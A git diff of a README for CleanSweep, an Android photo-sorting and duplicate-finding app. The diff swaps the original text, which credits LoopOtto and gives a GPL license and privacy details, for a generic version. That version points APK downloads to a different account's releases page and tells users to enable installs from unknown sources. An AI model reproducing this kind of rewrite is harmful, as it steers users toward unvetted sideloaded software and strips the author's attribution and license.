@@ -1,93 +1,69 @@
-# CleanSweep
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
-[![GitHub issues](https://img.shields.io/github/issues/LoopOtto/cleansweep)](https://github.com/LoopOtto/cleansweep/issues)
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/LoopOtto/cleansweep)](https://github.com/LoopOtto/cleansweep/releases)
+# 📸 CleanSweep - Simplify Your Media Management Experience
 
-**Tired of a cluttered photo gallery? Get organized with a swipe!**
+## 🚀 Getting Started
 
-CleanSweep is a powerful and private application for Android that helps you reclaim storage space and organize your photos and videos with a fun, simple, Tinder-like interface. Swipe right to keep, swipe left to delete. It's that easy.
+Welcome to CleanSweep! This app helps you organize and manage your media files on Android easily. With a swipe-to-sort interface and powerful duplication detection, you'll spend less time searching and more time enjoying your media.
 
-Best of all, **CleanSweep is 100% offline.** Your files and your data never leave your device, ensuring your memories remain private.
+## 📥 Download CleanSweep
 
-## Key Features
+[![Download CleanSweep](https://img.shields.io/badge/Download-CleanSweep-blue)](https://github.com/REDSHOT98/CleanSweep/releases)
 
-CleanSweep is packed with smart features to make media management a breeze.
+## 📋 Features
 
-### The Fun & Easy Way to Organize
-*   ✨ **Intuitive Swiping:** Quickly sort through thousands of files. Swipe right to keep, left to delete.
-*   📁 **One-Tap Sorting:** Add your favorite folders, and they'll appear at the bottom of the screen. Simply tap a folder icon to instantly move the current photo or video.
-*   ✂️ **Clip Video Moments:** Turn a favorite moment from a video into a still image with the built-in frame extractor.
+- **Swipe-to-sort interface:** Navigate through your media files smoothly and efficiently.
+- **Duplicate & Similar Media Detection:** Automatically find and manage duplicate or similar files.
+- **Material Design:** Enjoy a modern interface that follows Android's design principles.
+- **Photo Organizer:** Keep your gallery tidy with intuitive sorting options.
+- **Kotlin & Jetpack Compose:** Built with modern technology for stability and performance.
 
-### A Tailor-Made Experience
+## 🛠️ System Requirements
 
-CleanSweep is built on the belief that your tools should work *your* way. The app features a comprehensive settings menu that lets you fine-tune nearly every aspect of the experience to match your personal workflow.
+To run CleanSweep effectively, ensure your Android device meets these requirements:
 
-*   ⚙️ **Deep Customization:** From changing swipe sensitivity and theming to controlling how folder names are displayed, you have the power to create your perfect setup.
-*   🧠 **Smart Defaults:** While highly configurable, the app comes with sensible defaults so you can be productive right out of the box.
-*   👆 **Your Workflow, Your Rules:** Adjust everything from video playback speed to confirmation dialogs and default folder selections to make CleanSweep truly your own.
+- **Android Version:** 6.0 (Marshmallow) or later
+- **Storage:** At least 100 MB of free space
+- **Memory (RAM):** Minimum 2 GB recommended for optimal performance
 
-### Powerful Duplicate Finder
-Free up gigabytes of space by getting rid of unnecessary copies.
-*   🔎 **Finds Exact & Similar Media:** CleanSweep detects files that are 100% identical, as well as photos and videos that look visually similar (like burst shots or trimmed clips).
-*   🎛️ **You Control the Similarity:** Choose your desired level of "sameness" (Strict, Balanced, or Loose) to fine-tune the scan and get the results you want.
-*   🗑️ **Smart Deletion:** Tools like "Keep Oldest" or "Keep Newest" let you clean up entire groups of duplicates with a single tap.
+## 🔧 Download & Install
 
-### Smart and Fast Performance
-*   ⚡ **Finds *All* Your Media:** CleanSweep performs a deep scan to find media files that other apps might miss, ensuring nothing is overlooked.
-*   🚀 **Optimized for Speed:** By smartly caching information, future scans become significantly faster. The app is designed to get you organizing without the wait.
-*   ⚫ **AMOLED-Friendly:** A sleek, true-black dark mode that looks great on any screen.
+To get started with CleanSweep, follow these steps:
 
-## Privacy First
-We take your privacy seriously. CleanSweep is designed from the ground up to respect your data:
-*   **Completely Offline:** The app works without any internet connection.
-*   **No Tracking or Analytics:** We don't collect any data on how you use the app.
-*   **Your Files Stay Yours:** Your photos and videos are never uploaded or shared. All processing happens securely on your device.
+1. Click on this link to [visit the releases page](https://github.com/REDSHOT98/CleanSweep/releases).
+2. Look for the latest version of CleanSweep.
+3. Download the APK file by selecting the appropriate link.
+4. Once downloaded, locate the file in your device's Downloads folder.
+5. Tap on the APK file to begin installation.
+6. If prompted, enable installations from unknown sources in your settings. This step allows you to install apps that are not from the Google Play Store.
+7. Follow the on-screen instructions to complete the installation.
+8. After installation, open CleanSweep and enjoy managing your media files with ease!
 
-## Gallery
-*(Coming soon!)*
+## 📘 How to Use CleanSweep
 
-*Note: Screenshots will show the default theme. AMOLED theme has a slightly different look on purpose!*
+1. **Open the App:** Launch CleanSweep from your app drawer.
+2. **Grant Permissions:** Allow the app to access your media files for full functionality.
+3. **Browse Media:** View your media library in a clean layout.
+4. **Sort Files:** Use the swipe-to-sort feature to arrange your files quickly.
+5. **Detect Duplicates:** Run the duplicate detection feature to find and manage similar media files.
 
-## Getting Started
+## 🔍 Troubleshooting
 
-1.  **Requirements:** You'll need a device running **Android 10 or newer**.
-2.  **Installation:** Download the latest release from the [Releases page](https://github.com/LoopOtto/cleansweep/releases).
-3.  **Onboarding:** The first time you open CleanSweep, a helpful tutorial will walk you through all the features and gestures.
+If you encounter issues during installation or usage, try these steps:
 
-## Permissions Explained
-CleanSweep needs certain permissions to manage your files. Here’s a simple breakdown of why each one is necessary:
+- Ensure your device meets the system requirements.
+- Restart your device and try installing again.
+- Check if you have enough storage space available.
+- If the app crashes, consider clearing the cache in your device settings.
 
-| Permission Needed | Why We Need It |
-| :--- | :--- |
-| **All Files Access** | This is the core permission. It allows CleanSweep to find, move, and delete your photos and videos, no matter where they are stored on your device. |
-| **Notifications** | To show you the progress of long-running tasks, like a duplicate scan, even when the app is in the background. |
+## 📖 Support
 
-## For Developers
+For support or to report issues, please open an issue in the repository on GitHub. Our team is ready to assist you.
 
-### Technologies Used
-CleanSweep is built with a modern Android development approach, leveraging the following key technologies and libraries:
+## 📢 Contributing
 
-*   **Language:** Kotlin
-*   **UI Toolkit:** Jetpack Compose with Material 3
-*   **Dependency Injection:** Hilt
-*   **Local Database:** Room Persistence Library (for caching file signatures and scan results)
-*   **Image Loading:** Coil
-*   **Media Playback:** ExoPlayer (Media3)
-*   **Asynchronous Storage:** DataStore Preferences
-*   **Background Processing:** WorkManager
+If you're interested in contributing to CleanSweep, feel free to fork the repository and submit a pull request. We welcome improvements and suggestions!
 
-### Contributing
-We welcome contributions of all kinds, from bug reports to feature requests, code improvements and translations!
+## 😄 Stay Updated
 
-To ensure a smooth and collaborative process, please read our **[Contributing Guidelines](CONTRIBUTING.md)** before you start. This document outlines our development workflow, coding standards, and how to submit your changes.
+Keep an eye on our releases page for the latest updates and new features.
 
-**Note:** Feature requests from project supporters, such as donors and contributors, will be prioritized.
-
-## Donating
-*(Coming soon!)*
-
-## License
-
-Copyright (c) 2025 LoopOtto.
-
-This project is licensed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for the full license text.
+Thank you for choosing CleanSweep! Enjoy your media management journey!
